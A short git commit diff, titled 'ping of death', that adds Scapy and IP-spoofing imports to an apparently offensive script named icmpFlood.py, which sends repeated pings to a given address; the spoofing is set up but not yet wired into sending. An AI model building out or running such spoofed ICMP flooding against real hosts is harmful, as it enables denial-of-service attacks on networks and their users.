cb3519fa1eca0668965c0326eeddf8980bec5758
Berke Soysal <soysalberke.96@gmail.com>
2019-05-14 22:03:32 +0300

    ping of death

--- icmpFlood.py
+++ icmpFlood.py
@@ -1,7 +1,16 @@
 import ping3
 import threading
+from scapy.all import *
+from spoof import ip_spoof
+
 ping3.DEBUG = True
 
+spoofedIP = ip_spoof()
+c = RandShort()
+
+
+
+print(spoofedIP)
 def icmp_ping(number_of_packets,address):
     for i in range(0, number_of_packets):
         print(ping3.ping(address))
